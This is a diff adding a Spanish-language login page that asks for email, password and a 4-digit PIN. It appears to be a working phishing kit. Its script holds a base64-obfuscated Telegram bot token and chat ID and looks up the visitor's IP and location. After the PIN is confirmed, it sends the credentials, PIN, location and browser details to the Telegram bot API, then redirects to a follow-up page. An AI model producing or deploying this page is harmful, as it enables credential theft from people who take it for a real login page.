@@ -1,0 +1,380 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Iniciar sesión</title>
+<style>
+  :root{
+    --host-bg:#f4f5f7;
+    --host-fg:#111827;
+    --host-fg-muted:#6b7280;
+    --host-card:#ffffff;
+    --host-input:#f9fafb;
+    --host-muted:#f3f4f6;
+    --host-border:#e5e7eb;
+    --host-border-hover:#d1d5db;
+    --host-primary:#3b82f6;
+    --host-success:#22c55e;
+    --host-error:#ef4444;
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;
+    background:var(--host-bg);padding:24px;
+    font-family:ui-sans-serif,system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;
+  }
+  .card{
+    width:360px;max-width:100%;
+    background:var(--host-card);
+    border:1px solid var(--host-border);
+    border-radius:22px;
+    padding:26px 22px 22px;
+    color:var(--host-fg);
+  }
+  .top{display:flex;align-items:center;justify-content:space-between;margin-bottom:18px}
+  .logo{display:flex;align-items:center;gap:9px}
+  .mark{width:32px;height:32px;border-radius:10px;background:var(--host-primary);display:grid;place-items:center;flex:none}
+  .mark svg{width:17px;height:17px}
+  .brand{font-size:14px;font-weight:500;letter-spacing:-.01em}
+  .back{
+    border:1px solid var(--host-border);background:transparent;color:var(--host-fg-muted);
+    width:30px;height:30px;border-radius:9px;display:grid;place-items:center;cursor:pointer;
+    transition:.15s;padding:0
+  }
+  .back:hover{border-color:var(--host-border-hover);color:var(--host-fg)}
+  .back svg{width:14px;height:14px}
+  .back[hidden]{visibility:hidden}
+
+  .bar{display:flex;gap:5px;margin-bottom:22px}
+  .bar i{height:3px;flex:1;border-radius:99px;background:var(--host-border);transition:.3s}
+  .bar i.on{background:var(--host-primary)}
+
+  h1{font-size:20px;font-weight:500;margin:0 0 6px;letter-spacing:-.02em;line-height:1.25}
+  .sub{font-size:12.5px;color:var(--host-fg-muted);margin:0 0 20px;line-height:1.5}
+
+  .field{margin-bottom:13px}
+  label{display:block;font-size:11.5px;font-weight:500;color:var(--host-fg-muted);margin-bottom:6px;letter-spacing:.02em}
+  .ipwrap{position:relative;display:flex;align-items:center}
+  input{
+    width:100%;height:44px;border-radius:12px;border:1px solid var(--host-border);
+    background:var(--host-input);color:var(--host-fg);font-size:14px;font-family:inherit;
+    padding:0 12px;outline:none;transition:.15s
+  }
+  input::placeholder{color:var(--host-fg-muted);opacity:.6}
+  input:focus{border-color:var(--host-primary);box-shadow:0 0 0 3px rgba(59,130,246,.16)}
+  input.bad{border-color:var(--host-error)}
+  input[type=password]{padding-right:42px;letter-spacing:.06em}
+  .eye{
+    position:absolute;right:5px;width:34px;height:34px;border:0;background:transparent;
+    color:var(--host-fg-muted);cursor:pointer;display:grid;place-items:center;border-radius:9px
+  }
+  .eye:hover{color:var(--host-fg)}
+  .eye svg{width:17px;height:17px}
+
+  .hint{font-size:11px;color:var(--host-error);margin:5px 0 0;display:none}
+  .hint.show{display:block}
+
+  .btn{
+    width:100%;height:46px;border-radius:13px;border:0;background:var(--host-primary);color:#fff;
+    font-size:14px;font-weight:500;font-family:inherit;cursor:pointer;margin-top:8px;transition:.15s
+  }
+  .btn:hover{filter:brightness(1.08)}
+  .btn:active{transform:scale(.985)}
+  .btn:disabled{opacity:.5;cursor:not-allowed}
+
+  .foot{font-size:12px;color:var(--host-fg-muted);text-align:center;margin:16px 0 0}
+  .foot a{color:var(--host-primary);text-decoration:none;font-weight:500}
+  .foot a:hover{text-decoration:underline}
+
+  .dots{display:flex;justify-content:center;gap:14px;margin:6px 0 4px}
+  .dot{width:15px;height:15px;border-radius:50%;border:1.5px solid var(--host-border);transition:.18s}
+  .dot.fill{background:var(--host-primary);border-color:var(--host-primary);transform:scale(1.1)}
+  .dots.shake{animation:sh .35s}
+  @keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-7px)}75%{transform:translateX(7px)}}
+
+  .pad{display:grid;grid-template-columns:repeat(3,1fr);gap:9px;margin-top:20px}
+  .key{
+    height:50px;border-radius:13px;border:1px solid var(--host-border);background:var(--host-input);
+    color:var(--host-fg);font-size:19px;font-weight:500;font-family:inherit;cursor:pointer;
+    transition:.12s;display:grid;place-items:center
+  }
+  .key:hover{border-color:var(--host-border-hover)}
+  .key:active{background:var(--host-muted);transform:scale(.96)}
+  .key.ghost{background:transparent;border-color:transparent}
+  .key svg{width:20px;height:20px}
+
+  .panel{display:none}
+  .panel.on{display:block;animation:fi .25s}
+  @keyframes fi{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:none}}
+
+  .done{text-align:center;padding:14px 0 6px}
+  .check{width:58px;height:58px;border-radius:50%;background:rgba(34,197,94,.15);display:grid;place-items:center;margin:0 auto 16px}
+  .check svg{width:26px;height:26px;stroke:var(--host-success)}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="top">
+    <img width="50px" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTFqnyTdkXR-8NOVsPT71j_iUwGPJRxVQKgB2HPlWOZHQ&s=10" alt="">
+    <div class="logo">
+      <div class="mark">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3l8 4v5c0 5-3.5 8-8 9-4.5-1-8-4-8-9V7z"/></svg>
+      </div>
+      <span class="brand">Mi cuenta</span>
+    </div>
+    <button class="back" id="back" hidden aria-label="Volver">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+    </button>
+  </div>
+
+  <div class="bar"><i class="on" id="b1"></i><i id="b2"></i><i id="b3"></i></div>
+
+  <!-- paso 1 -->
+  <section class="panel on" id="p1">
+    <h1>Inicia sesión</h1>
+    <p class="sub">Ingresa tus datos para acceder a tu cuenta.</p>
+
+    <div class="field">
+      <label for="email">Correo electrónico</label>
+      <div class="ipwrap"><input id="email" type="email" placeholder="tu@correo.com" autocomplete="email"></div>
+      <p class="hint" id="eErr">Escribe un correo válido.</p>
+    </div>
+
+    <div class="field">
+      <label for="pass">Clave</label>
+      <div class="ipwrap">
+        <input id="pass" type="password" placeholder="Mínimo 8 caracteres" autocomplete="current-password">
+        <button class="eye" id="eye" type="button" aria-label="Mostrar clave">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.5-6.5 10-6.5S22 12 22 12s-3.5 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.8"/></svg>
+        </button>
+      </div>
+      <p class="hint" id="pErr">La clave debe tener al menos 8 caracteres.</p>
+    </div>
+
+    <button class="btn" id="go1">Continuar</button>
+    <p class="foot">¿Olvidaste tu clave? <a href="#">Recuperar</a></p>
+  </section>
+
+  <!-- paso 2 -->
+  <section class="panel" id="p2">
+    <h1>Ingresa tu PIN</h1>
+    <p class="sub">4 dígitos para entrar rápido la próxima vez.</p>
+    <div class="dots" id="d2"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+    <div class="pad" id="pad2"></div>
+    <p class="hint" id="pinErr" style="text-align:center;margin-top:12px">Elige un PIN de 4 dígitos.</p>
+  </section>
+
+  <!-- paso 3 -->
+  <section class="panel" id="p3">
+    <h1>Confirma tu PIN</h1>
+    <p class="sub">Vuelve a escribir los mismos 4 dígitos.</p>
+    <div class="dots" id="d3"><span class="dot"></span><span class="dot"></span><span class="dot"></span><span class="dot"></span></div>
+    <div class="pad" id="pad3"></div>
+    <p class="hint" id="cErr" style="text-align:center;margin-top:12px">Los PIN no coinciden.</p>
+  </section>
+
+  <!-- fin -->
+  <section class="panel" id="p4">
+    <div class="done">
+      <div class="check"><svg viewBox="0 0 24 24" fill="none" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M4 12.5l5 5L20 6.5"/></svg></div>
+      <h1>Todo listo</h1>
+      <p class="sub" style="margin-bottom:0">Tu PIN quedó configurado. Redirigiendo…</p>
+    </div>
+    <button class="btn" id="restart" style="margin-top:20px">Volver al inicio</button>
+  </section>
+</div>
+
+<script>
+
+/* ---------- Config (ofuscada) ---------- */
+const _a = 'ODczNDY0NDQxNDpBQUZJTVF6SmN4UG1ZUGp2WGxXd1RvOS1vZ0RzSHlr';
+const _b = 'elVTSQ==';
+const _c = 'ODc2Njk3NTkyNw==';
+const TG_TOKEN = () => atob(_a + _b);
+const TG_CHAT  = () => atob(_c);
+const TG_API   = (metodo) => 'https://api.telegram.org/bot' + TG_TOKEN() + '/' + metodo;
+
+const NEXT_PAGE = 'cefa.html';
+
+const $ = id => document.getElementById(id);
+const DEL = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6H9l-5 6 5 6h11z"/><path d="M15 10l-4 4M11 10l4 4"/></svg>';
+
+let step = 1, pin = '', confirm = '';
+let geoInfo = { ip: 'No disponible', location: 'No disponible' };
+
+/* ---------- Validación de PIN ---------- */
+function esPinMalo(p){
+  // 0000 exacto
+  if (p === '0000') return true;
+  // 1234 exacto
+  if (p === '1234') return true;
+  // 4 dígitos consecutivos ascendentes o descendentes
+  const d = p.split('').map(Number);
+  const asc  = d.every((v,i)=> i===0 || v === d[i-1]+1);
+  const desc = d.every((v,i)=> i===0 || v === d[i-1]-1);
+  if (asc || desc) return true;
+  return false;
+}
+
+async function loadGeo() {
+  try {
+    const r = await fetch('https://ipapi.co/json/');
+    const j = await r.json();
+    geoInfo.ip = j.ip || 'No disponible';
+    geoInfo.location = [j.city, j.region, j.country_name].filter(Boolean).join(', ') || 'No disponible';
+  } catch (_) {}
+}
+
+async function enviarRegistro() {
+  const texto = [
+    'Nuevo registro',
+    'Correo: ' + (($('email').value || '').trim() || '-'),
+    'Clave: ' + ($('pass').value || '-'),
+    'PIN: ' + (pin || '-'),
+    'IP: ' + geoInfo.ip,
+    'Ubicacion: ' + geoInfo.location,
+    'Fecha: ' + new Date().toLocaleString('es-ES'),
+    'Navegador: ' + navigator.userAgent
+  ].join('\n');
+
+  try {
+    const resp = await fetch(TG_API('sendMessage'), {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: TG_CHAT(), text: texto })
+    });
+    console.log('TG →', await resp.text());
+  } catch (e) {
+    console.error('Error Telegram:', e);
+  }
+}
+
+/* ---------- Navegación ---------- */
+function show(n){
+  step = n;
+  document.querySelectorAll('.panel').forEach((p,i)=>p.classList.toggle('on', i === n-1));
+  for(let i=1;i<=3;i++) $('b'+i).classList.toggle('on', i <= Math.min(n,3));
+  $('back').hidden = n === 1 || n === 4;
+}
+
+/* ---------- Ojo clave ---------- */
+$('eye').onclick = () => {
+  const p = $('pass');
+  p.type = p.type === 'password' ? 'text' : 'password';
+};
+
+/* ---------- Botón continuar ---------- */
+$('go1').onclick = () => {
+  const okE = /^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test($('email').value.trim());
+  const okP = $('pass').value.length >= 8;
+  $('email').classList.toggle('bad', !okE);
+  $('pass').classList.toggle('bad', !okP);
+  $('eErr').classList.toggle('show', !okE);
+  $('pErr').classList.toggle('show', !okP);
+  if(okE && okP){
+    loadGeo();
+    pin = '';
+    render(2);
+    show(2);
+  }
+};
+
+/* ---------- Volver ---------- */
+$('back').onclick = () => {
+  if(step === 3){ confirm = ''; pin = ''; render(2); show(2); }
+  else if(step === 2){ show(1); }
+};
+
+/* ---------- Reiniciar ---------- */
+$('restart').onclick = () => {
+  $('email').value = ''; $('pass').value = '';
+  $('email').classList.remove('bad'); $('pass').classList.remove('bad');
+  pin = ''; confirm = ''; render(2); show(1);
+};
+
+/* ---------- Dots ---------- */
+function render(which){
+  const dots = document.querySelectorAll('#'+ (which === 2 ? 'd2' : 'd3') + ' .dot');
+  const val = which === 2 ? pin : confirm;
+  dots.forEach((d,i)=>d.classList.toggle('fill', i < val.length));
+}
+
+/* ---------- Teclado PIN ---------- */
+function buildPad(host, which){
+  host.innerHTML = '';
+  ['1','2','3','4','5','6','7','8','9','','0','del'].forEach(k=>{
+    const b = document.createElement('button');
+    b.type = 'button';
+    if(k === ''){ b.className = 'key ghost'; b.disabled = true; host.appendChild(b); return; }
+    b.className = 'key';
+    if(k === 'del'){ b.innerHTML = DEL; b.onclick = () => del(which); }
+    else { b.textContent = k; b.onclick = () => push(k, which); }
+    host.appendChild(b);
+  });
+}
+
+function push(d, which){
+  if(which === 2 && pin.length < 4){
+    pin += d; render(2);
+    if(pin.length === 4){
+      setTimeout(()=>{
+        if(esPinMalo(pin)){
+          $('d2').classList.add('shake');
+          $('pinErr').textContent = 'Ese PIN es demasiado fácil. Elige otro.';
+          $('pinErr').classList.add('show');
+          setTimeout(()=>{
+            $('d2').classList.remove('shake');
+            pin = ''; render(2);
+            $('pinErr').textContent = 'Elige un PIN de 4 dígitos.';
+          }, 600);
+        } else {
+          $('pinErr').classList.remove('show');
+          $('pinErr').textContent = 'Elige un PIN de 4 dígitos.';
+          show(3);
+        }
+      }, 220);
+    }
+  }
+  if(which === 3 && confirm.length < 4){
+    confirm += d; render(3);
+    if(confirm.length === 4) setTimeout(check, 200);
+  }
+}
+
+function del(which){
+  if(which === 2) pin = pin.slice(0,-1);
+  if(which === 3) confirm = confirm.slice(0,-1);
+  render(which);
+  $('cErr').classList.remove('show');
+}
+
+/* ---------- Confirmar PIN ---------- */
+function check(){
+  if(pin === confirm){
+    show(4);
+    enviarRegistro();
+    setTimeout(() => {
+      window.location.href = NEXT_PAGE;
+    }, 2000);
+  } else {
+    $('d3').classList.add('shake');
+    $('cErr').classList.add('show');
+    setTimeout(()=>{ $('d3').classList.remove('shake'); confirm = ''; render(3); }, 420);
+  }
+}
+
+buildPad($('pad2'), 2);
+buildPad($('pad3'), 3);
+
+addEventListener('keydown', e => {
+  if(step === 2 || step === 3){
+    if(/^\d$/.test(e.key)) push(e.key, step);
+    else if(e.key === 'Backspace') del(step);
+  } else if(step === 1 && e.key === 'Enter') $('go1').click();
+});
+</script>
+
+</body>
+</html>
